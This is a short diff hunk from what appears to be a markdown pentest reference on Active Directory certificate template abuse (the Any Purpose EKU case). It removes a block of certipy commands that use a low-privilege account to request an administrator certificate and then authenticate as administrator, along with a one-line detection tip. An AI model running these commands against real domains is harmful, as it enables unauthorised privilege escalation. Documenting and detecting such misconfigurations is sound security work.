@@ -21,14 +21,3 @@ The **Any Purpose EKU** satisfies any service authentication requirement. It is 
 
 ### Commands
 ```bash
-# Same as ESC1 — the vulnerable template has Any Purpose EKU
-certipy req -u lowpriv@corp.local -p 'Password123!' \
-  -ca CORP-CA -template AnyPurposeTemplate \
-  -upn administrator@corp.local
-certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
-```
-
-### Impact / detection
-Same as ESC1. **Flag templates with Any Purpose EKU** and remove the EKU or restrict enrolment.
-
----
